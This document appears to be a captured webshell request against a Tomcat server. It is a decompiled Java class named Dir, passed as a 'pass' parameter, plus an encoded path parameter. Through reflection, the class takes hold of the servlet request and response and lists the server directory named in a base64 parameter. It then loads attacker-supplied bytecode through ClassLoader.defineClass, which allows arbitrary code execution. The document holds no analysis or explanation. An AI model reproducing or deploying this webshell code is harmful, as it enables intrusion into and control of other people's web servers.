pass=/*
 * Decompiled with CFR.
 * 
 * Could not load the following classes:
 *  javax.servlet.http.HttpServletRequest
 *  javax.servlet.http.HttpServletResponse
 */
package filemanager;

import java.io.File;
import java.lang.Boolean;
import java.lang.Class;
import java.lang.ClassLoader;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuffer;
import java.lang.System;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Dir {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder = "base64";
    public String cs = "UTF8";
    public String randomPrefix = "2";
    public String decoderClassdata;

    public boolean equals(Object object) {
        this.parseObj(object);
        this.cs = String.valueOf(Charset.forName(System.getProperty("sun.jnu.encoding")));
        StringBuffer stringBuffer = new StringBuffer();
        String string = "90b407";
        String string2 = "c468845971";
        String string3 = "d7a46d926775ab";
        String string4 = "p191cfe6932c4b";
        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(String.valueOf(this.cs));
            this.response.setCharacterEncoding(String.valueOf(this.cs));
            String string5 = this.decode(this.request.getParameter(string3));
            this.decoderClassdata = this.decode(this.request.getParameter(string4));
            stringBuffer.append(this.FileTreeCode(string5));
        }
        catch (Exception exception) {
            stringBuffer.append("ERROR:// " + exception.toString());
        }
        try {
            this.response.getWriter().print(string + this.asoutput(stringBuffer.toString()) + string2);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return true;
    }

    public String decode(String string) throws Exception {
        int n = 0;
        try {
            n = Integer.parseInt(this.randomPrefix);
            string = string.substring(n);
        }
        catch (Exception exception) {
            n = 0;
        }
        if (this.encoder.equals("base64")) {
            return new String(this.Base64DecodeToByte(string), this.cs);
        }
        return string;
    }

    public String FileTreeCode(String string) throws Exception {
        File file = new File(string);
        File[] fileArray = file.listFiles();
        String string2 = "";
        String string3 = "";
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < fileArray.length; ++i) {
            Date date = new Date(fileArray[i].lastModified());
            String string4 = simpleDateFormat.format(date);
            String string5 = fileArray[i].canRead() ? "R" : "-";
            string5 = string5 + (fileArray[i].canWrite() ? "W" : "-");
            try {
                string5 = string5 + ((Boolean)fileArray[i].getClass().getMethod("canExecute", new Class[0]).invoke(fileArray[i], new Object[0]) != false ? "X" : "-");
            }
            catch (Exception exception) {
                string5 = string5 + "-";
            }
            String string6 = fileArray[i].getName();
            if (fileArray[i].isDirectory()) {
                string2 = string2 + string6 + "/\t" + string4 + "\t" + fileArray[i].length() + "\t" + string5 + "\n";
                continue;
            }
            string3 = string3 + string6 + "\t" + string4 + "\t" + fileArray[i].length() + "\t" + string5 + "\n";
        }
        string2 = string2 + string3;
        return string2;
    }

    public void parseObj(Object object) {
        block8: {
            if (object.getClass().isArray()) {
                Object[] objectArray = (Object[])object;
                this.request = (HttpServletRequest)objectArray[0];
                this.response = (HttpServletResponse)objectArray[1];
            } else {
                try {
                    Class<?> clazz = Class.forName("javax.servlet.jsp.PageContext");
                    this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest", new Class[0]).invoke(object, new Object[0]);
                    this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse", new Class[0]).invoke(object, new Object[0]);
                }
                catch (Exception exception) {
                    if (!(object instanceof HttpServletRequest)) break block8;
                    this.request = (HttpServletRequest)object;
                    try {
                        Field field = this.request.getClass().getDeclaredField("request");
                        field.setAccessible(true);
                        HttpServletRequest httpServletRequest = (HttpServletRequest)field.get(this.request);
                        Field field2 = httpServletRequest.getClass().getDeclaredField("response");
                        field2.setAccessible(true);
                        this.response = (HttpServletResponse)field2.get(httpServletRequest);
                    }
                    catch (Exception exception2) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(object, new Object[0]);
                        }
                        catch (Exception exception3) {
                            // empty catch block
                        }
                    }
                }
            }
        }
    }

    public String asoutput(String string) {
        try {
            byte[] byArray = this.Base64DecodeToByte(this.decoderClassdata);
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            method.setAccessible(true);
            Class clazz = (Class)method.invoke(this.getClass().getClassLoader(), byArray, 0, byArray.length);
            return clazz.getConstructor(String.class).newInstance(string).toString();
        }
        catch (Exception exception) {
            return string;
        }
    }

    public byte[] Base64DecodeToByte(String string) {
        byte[] byArray = null;
        String string2 = System.getProperty("java.version");
        try {
            if (string2.compareTo("1.9") >= 0) {
                Class<?> clazz = Class.forName("java.util.Base64");
                Object object = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
                byArray = (byte[])object.getClass().getMethod("decode", String.class).invoke(object, string);
            } else {
                Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
                byArray = (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), string);
            }
            return byArray;
        }
        catch (Exception exception) {
            return new byte[0];
        }
    }
}

d7a46d926775ab=/usr/local/tomcat/
p191cfe6932c4b=
